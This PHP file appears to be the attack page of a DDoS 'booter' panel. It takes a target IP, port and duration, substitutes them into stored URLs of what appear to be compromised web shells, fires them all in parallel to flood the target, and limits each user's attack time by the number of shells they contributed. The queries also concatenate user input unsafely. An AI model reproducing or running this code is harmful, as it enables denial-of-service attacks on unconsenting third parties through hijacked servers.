<?php
ob_start();
set_time_limit(0);
include 'inc/db.php';
include 'inc/header.php';
if (!($user->LoggedIn())) {
    header('location: login.php');
    die();
}

$query = "SELECT COUNT( * ) AS total FROM `shells` WHERE `UserID` = " . $_SESSION['ID'];
$result = $mysqli->query($query) or die($query . '<br />' . $mysqli->error);
$row        = mysqli_fetch_assoc($result);
$shellcount = $row['total'];
$pre        = $shellcount * 15;
$times      = $pre + 15;
if (isset($_GET['submit'])) {
    $host = $_GET['host'];
    $port = $_GET['port'];
    $time = $_GET['time'];
    if (empty($host) || empty($port) || empty($time)) {
        echo '<br><p class="error">Please fill in all fields</p>';
    } else {
        if ($host == "hackforums.net") {
            die('<br><p class="error">You cannot attack this.</p>');
        }
        if ($time > $times) {
            die('<br><p class="error">You cannot issue attacks exceeding ' . $times . ' seconds.</p>');
        } else {
            if (!filter_var($host, FILTER_VALIDATE_IP)) {
                die('<br><p class="error">Please enter a valid IP.</p>');
            }
                $user  = $_SESSION['ID'];
                $query = "SELECT * FROM `logs` WHERE `user` = '$user' ORDER BY `ID` DESC";
                $result = $mysqli->query($query) or die($query . '<br />' . $mysqli->error);
                $row     = mysqli_fetch_assoc($result);
                $utime   = time();
                $rowtime = $row['utime'];
                $sqltime = $utime + $time;
                if ($utime < $rowtime) {
                    echo '<br><p class="error">You already have a boot running</p>';
                } else {
                    $host  = $_GET['host'];
                    $time  = intval($_GET['time']);
                    $port  = intval($_GET['port']);
                    $user  = $_SESSION['ID'];
                    $url = array();
                    $query = "SELECT * FROM shells";
                    $result = $mysqli->query($query) or die($query . '<br />' . $mysqli->error);
                    $num_rows = $result->num_rows;
                    $query    = "SELECT `URL` FROM `shells`";
                    $result = $mysqli->query($query) or die($query . '<br />' . $mysqli->error);
                    while ($row = mysqli_fetch_assoc($result)) {
                        $arrayFind    = array(
                            '[host]',
                            '[port]',
                            '[time]'
                        );
                        $arrayReplace = array(
                            $host,
                            $port,
                            $time
                        );
                        $APILink      = str_replace($arrayFind, $arrayReplace, $row['URL']);
                        $url[] .= $APILink;
                    }
                    $pg = new ParallelGet($url);
                    $query = "INSERT INTO `logs` (`ID`, `user`, `ip`, `port`, `time`, `utime`) VALUES (NULL, '$user', '$host', '$port', '$time', '$sqltime')";
                    $mysqli->query($query) or die($query . '<br />' . $mysqli->error);
                    echo '<br><p class="success">Attack has been sent to ' . $host . ':' . $port . ' for ' . $time . ' seconds</p>';
                }
            }
        }
    }
?>
<html>
    <body>
        <p class="text">
            Welcome to the boot page :D<br>
            Please enter the required fields and click submit<br>
            Repeatedly hitting the same IP is not allowed and you will be banned for it
        </p>
        <p class="stats1">Your total boot time:</p><p class="stats2"><?php
        echo $times;
        ?></p><br>
        <div class="formRow" align="center">
            <form>
                IP/DNS:<br>
                <input type="text" id="host" name="host" value=""/>
                <br>
                Seconds:<br>
                <input type="text" id="time" name="time" value="15"/>
                <br>
                Port:<br>
                <input type="text" name="port" value="80"/>
                <br>
                <input type="hidden" id="submit" name="submit" value="1">
                <br>
                                <input type="submit" class="large blue button" value="Initiate Attack" onclick="hub();" />
            </form>
        </div>
    </body>
</html>